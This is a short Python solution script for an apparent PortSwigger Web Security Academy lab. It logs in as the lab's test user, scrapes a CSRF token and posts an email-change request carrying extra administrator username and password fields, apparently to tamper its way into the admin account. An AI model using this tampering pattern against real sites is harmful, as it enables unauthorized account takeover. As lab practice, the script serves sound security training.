import requests

DOMAIN = "0a1100c40447ebd8841b556600d70054.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Referer": f"https://{DOMAIN}/login",
    "Cookie": "session=O5M3c7yft3jXsxvmY6trdibUiDUhbjXg",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "TE": "trailers"
}

def get_csrf_token_login():
    response = requests.get(f"https://{DOMAIN}/login")
    csrf = response.text.split('csrf" value="')[1].split('"')[0]
    HEADERS["Cookie"] = response.headers["Set-Cookie"].split(";")[0]
    return csrf

def login():
    csrf = get_csrf_token_login()
    data = {
        "csrf": csrf,
        "username": "wiener",
        "password": "peter"
    }

    response = requests.post(f"https://{DOMAIN}/login", data=data, headers=HEADERS, allow_redirects=False)

    if response.status_code == 302:
        print(f"Login successful as wiener:peter")
        HEADERS["Cookie"] = response.headers["Set-Cookie"].split(";")[0]
        print(f"New cookie: {HEADERS['Cookie'].split('=')[1]}")

def get_csrf_token_email():
    response = requests.get(f"https://{DOMAIN}/my-account", headers=HEADERS)
    csrf = response.text.split('csrf" value="')[1].split('"')[0]
    print(response.text)
    return csrf

def change_email():
    csrf = get_csrf_token_email()
    data = {
        "csrf": csrf,
        "email": "hello@hello.com",
        "username": "administrator",
        "password": "admin"
    }

    response = requests.post(f"https://{DOMAIN}/my-account/change-email", data=data, headers=HEADERS, allow_redirects=False)

    if response.status_code == 302:
        print(f"Email changed")

def get_email():
    response = requests.get(f"https://{DOMAIN}/my-account", headers=HEADERS)
    print(response.text)


login()
change_email()
